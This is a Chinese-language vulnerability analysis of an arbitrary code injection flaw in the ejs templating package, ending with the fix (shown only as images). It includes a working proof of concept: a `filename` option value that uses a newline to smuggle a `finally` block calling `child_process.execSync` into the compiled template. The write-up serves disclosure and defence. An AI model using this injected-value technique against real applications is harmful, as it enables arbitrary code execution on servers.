# ejs模板任意代码注入（Arbitrary Code Injection）

### ejs*

![](https://github.com/DuLinRain/pictures/blob/master/arbitrary_code_injection/arbitrary_code_injection_1.png?raw=true)

![](https://github.com/DuLinRain/pictures/blob/master/arbitrary_code_injection/arbitrary_code_injection_2.png?raw=true)

### 漏洞分析
[ejs](https://www.npmjs.com/package/ejs)是一个非常流行的开源NPM包，其在模板编译过程中，内部生成的模板会有一个在最后添加注释的操作：

![](https://github.com/DuLinRain/pictures/blob/master/arbitrary_code_injection/arbitrary_code_injection_3.png?raw=true)

这个地方直接取的是`filename`。内部生成的模板如下：

	try {
	  var __output = "";
	  function __append(s) { if (s !== undefined && s !== null) __output += s }
	  with (locals || {}) {
	    ; __append(escapeFn( people.join(", ") ))
	  }
	  return __output;
	} catch (e) {
	  rethrow(e, __lines, __filename, __line, escapeFn);
	}
	//# sourceURL=xxx
	
	
ejs的基本用法如下:

	let template = ejs.compile(str, options);
	template(data);
	// => Rendered HTML string
	 
	ejs.render(str, data, options);
	// => Rendered HTML string
	 
	ejs.renderFile(filename, data, options, function(err, str){
	    // str => Rendered HTML string
	});
	
	
可以通过`options`参数来提交一个`filename`参数，这个参数没有做严格的校验，所以，假设我们写如下代码：

	let people = ['geddy', 'neil', 'alex'],
	      html = ejs.render('<%= people.join(", "); %>', {people: people}, {
	        compileDebug: true,
	        client: true,
	        filename:'/etc/passwd\nfinally { this.global.process.mainModule.require(\'child_process\').execSync(\'touch EJS_HACKED\') }'
	      });
	      
	      
ejs编译过程中的模板如下：

	var __line = 1
	  , __lines = "<%= people.join(\", \"); %>"
	  , __filename = "/etc/passwd\nfinally { this.global.process.mainModule.require('child_process').execSync('touch EJS_HACKED') }";
	try {
	  var __output = "";
	  function __append(s) { if (s !== undefined && s !== null) __output += s }
	  with (locals || {}) {
	    ; __append(escapeFn( people.join(", ") ))
	  }
	  return __output;
	} catch (e) {
	  rethrow(e, __lines, __filename, __line, escapeFn);
	}
	
	//# sourceURL=/etc/passwd
	finally { this.global.process.mainModule.require('child_process').execSync('touch EJS_HACKED') }
	
在这里，我们恰好利用这个漏洞在内部模板里通过`\n`注入了`finally`代码块，在里面可以执行任意JS(这里的示例是创建了一个EJS_HACKED文件)。

### 漏洞修复
修复方式：

![](https://github.com/DuLinRain/pictures/blob/master/arbitrary_code_injection/arbitrary_code_injection_4.png?raw=true)

![](https://github.com/DuLinRain/pictures/blob/master/arbitrary_code_injection/arbitrary_code_injection_5.png?raw=true)